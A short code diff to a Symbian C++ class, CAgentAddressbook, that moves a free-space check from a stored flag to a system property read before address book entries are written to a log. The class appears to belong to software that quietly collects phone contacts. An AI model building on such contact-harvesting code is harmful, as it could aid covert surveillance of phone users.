@@ -192,28 +192,6 @@ void CAgentAddressbook::StopAgentCmdL()
 	CloseLogL();
 	}
 
-void CAgentAddressbook::NotifyAgentCmdL(TUint32 aData)
-	{
-	TInt notifyType = aData & 0x000000ff;
-	switch(notifyType)
-		{
-		case ENotifyThreshold:
-			{
-			TInt value = (aData & 0x0000ff00) >> 8;
-			if (value == EBelow)
-				{
-				iBelowFreespaceQuota = ETrue;
-				}
-			else
-				{
-				iBelowFreespaceQuota = EFalse;
-				}
-			}
-			break;
-		default:
-			break;
-		}
-	}
 
 TBool CAgentAddressbook::ContainsEmptyField(const CContactItemFieldSet& fields)
 	{
@@ -353,7 +331,9 @@ void CAgentAddressbook::DoOneRoundL()
 		buf.CleanupClosePushL();
 		if (buf.Length() > 0)
 			{
-			if(!iBelowFreespaceQuota)
+			TInt value;
+			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold,value );
+			if(value)
 				{
 				// dump the buffer to the file log. 
 				AppendLogL(buf);
@@ -482,7 +462,9 @@ void CAgentAddressbook::HandleDatabaseEventL(TContactDbObserverEvent aEvent)
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					if(!iBelowFreespaceQuota)
+					TInt value;
+					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					if(value)
 						{
 						// append the buffer
 						CLogFile* logFile = CLogFile::NewLC(iFs);
